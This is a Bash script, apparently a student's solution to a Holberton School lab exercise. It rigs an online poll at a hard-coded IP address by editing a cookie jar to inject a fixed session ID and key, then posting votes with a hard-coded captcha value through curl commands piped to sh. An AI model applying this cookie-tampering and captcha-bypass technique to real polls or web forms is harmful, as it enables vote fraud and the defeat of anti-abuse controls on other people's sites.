#See you later hacker! [0]
#author @fesurocuts 790@holbertonschool.com fesusrocuts@gmail.com
#version 1.0.0.0
#date 08-06-2019
#run this code as root user
#description: the technique is attack use the lib curl from Linux Ubuntu
#try hack poll #1
_PHPSESSION="910g0b5h17d73nnha1mcm37vu7" #is dinamic
_key=f259c3b43b6c6b618f3de8aa147c16ee89ce865e
_captcha="ca0dbdf2"
_id=790
_filename1="cookie.txt"
_filename2="cookiemod.txt"
_filename3="reg"$(date +%s)".html" 
_filename4="copy_sh_"$_filename3 
_url="http://158.69.76.135/level5.php"
_command1="curl -b $_filename1 -c $_filename1 -I $_url"
_command2din="cat $_filename1 | cut -f1,2,3,4,5,6,7 | tail -2 | head -n 1 > $_filename2"
_command2="cat $_filename1 | cut -f1,2,3,4,5,6 | tail -2 | head -n 1 | awk '{print \$0\"\t$_PHPSESSION\"}' > tmp1.txt"
_command3="cat $_filename1 | cut -f1,2,3,4,5,6 | tail -1 | head -n 1 | awk '{print \$0\"\t$_key\"}' > tmp2.txt"
_command4="cat tmp1.txt > $_filename2"
_command5="cat tmp2.txt >> $_filename2"
_command6="curl -H 'Content-Type: multipart/form-data' -H 'Transfer-Encoding: chunked' -c $_filename2 -X POST -F 'id=$_id' -F 'captcha=$_captcha' -F 'key=$_key' $_url > $_filename3"
#_command4="curl -H 'Content-Type: multipart/form-data' -H 'Transfer-Encoding: chunked' -c $_filename2 -X POST -d 'id=$_id&captcha=$_captcha&key=$_key&holdthedoor=Submit+Query&' $_url > $_filename3"
echo ">>>try hack ..."
echo ">>>KEY="$_key
echo ">>>CAPTCHA="$_captcha
echo "--"
echo ">>>test connection #1 ..."
echo $_command1
echo $_command1 | sh
echo ">>>update jar #2 ..."
echo $_command2
echo $_command2 | sh
echo ">>>preview command3 ..."
echo $_command3
echo $_command3 | sh
echo ">>>join tmp to jar ..."
echo $_command4 | sh
echo $_command5 | sh
echo ">>>save command #3 ..."
echo $_command6 > $_filename4
echo ">>>connect server and update poll #4 ..."
echo $_command6 | sh
